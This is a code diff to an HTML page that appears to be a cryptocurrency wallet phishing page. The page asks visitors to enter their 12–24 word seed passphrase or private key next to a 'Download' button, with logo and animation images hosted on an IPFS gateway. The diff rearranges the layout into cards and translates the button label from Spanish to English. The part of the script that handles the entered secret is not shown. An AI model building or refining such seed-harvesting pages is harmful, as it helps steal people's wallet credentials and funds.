@@ -25,13 +25,6 @@
       }
     }
 
-    .image-logo {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      width: 100px;
-    }
-
     .container {
       max-width: 600px;
       margin: 0 auto;
@@ -118,13 +111,21 @@
       background-color: #138496;
     }
 
+    .image-logo {
+      width: 100px;
+    }
+
+    .card {
+      background-color: #e9ecef;
+      border: 2px solid #17a2b8;
+      padding: 20px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+
     .image-gif {
-      margin: 0 auto;
-      width: 80%;
-      position: absolute;
-      bottom: 20px;
-      left: 0;
-      right: 0;
+      width: 100%;
+      height: auto;
     }
 
     @keyframes loading {
@@ -153,12 +154,16 @@
 </head>
 <body>
   <div class="container">
-    <img class="image-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmQyw5FbGkGgZeAgnUSs1h1MeRkYpaXCFrm2V5G56ieLZy?_gl=1*1vqjvjn*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4NzY2NTA4Ni4yMi4xLjE2ODc2NjczODEuNjAuMC4w" alt="Logo">
-    <button class="back-button" onclick="window.history.back()">Back</button>
     <h2>Enter your 12-24 word passphrase or paste your PrivateKey to continue</h2>
-    <input type="text" id="input-text" class="input-field" placeholder="Enter text">
-    <button id="download-button" class="button">Download</button>
-    <img class="image-gif" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmSWfM1zRSd96jbHj3sJSZcigGt6zjwxtWUhtbLD6AaEQg" alt="Animation">
+    <div class="card">
+      <img class="image-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmQyw5FbGkGgZeAgnUSs1h1MeRkYpaXCFrm2V5G56ieLZy?_gl=1*1vqjvjn*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4NzY2NTA4Ni4yMi4xLjE2ODc2NjczODEuNjAuMC4w" alt="Logo">
+      <input type="text" id="input-text" class="input-field" placeholder="Enter text">
+      <button id="download-button" class="button">Download</button>
+    </div>
+    <div class="card">
+      <img class="image-gif" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmSWfM1zRSd96jbHj3sJSZcigGt6zjwxtWUhtbLD6AaEQg" alt="Animation">
+    </div>
+    <button class="back-button" onclick="window.history.back()">Back</button>
   </div>
 
   <script>
@@ -199,7 +204,7 @@
           clearInterval(interval);
           button.disabled = false;
           button.classList.remove("loading-button");
-          button.innerText = "Descargar";
+          button.innerText = "Download";
         }
       }, 200);
     }
